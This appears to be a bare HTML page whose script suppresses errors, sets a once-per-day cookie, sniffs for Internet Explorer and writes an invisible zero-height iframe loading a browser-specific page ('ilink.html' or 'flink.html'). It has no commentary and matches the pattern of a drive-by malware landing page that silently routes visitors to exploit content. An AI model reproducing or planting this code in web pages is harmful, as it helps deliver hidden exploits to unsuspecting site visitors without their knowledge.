<html><script>window.onerror=function(){return true;}
function init(){window.status="";}window.onload = init;
if(document.cookie.indexOf("play=")==-1)
{
var expires=new Date();
expires.setTime(expires.getTime()+24*60*60*1000);
document.cookie="play=Yes;path=/;expires="+expires.toGMTString();
if(navigator.userAgent.toLowerCase().indexOf("msie")>0)
{

document.write("<iFrame src=ilink.html width=100 height=0></iframe>");
document.write("");
}
else{
document.write("<iframe src=flink.html width=100 height=0></iframe>");
document.write("");
}
}
</script></html>
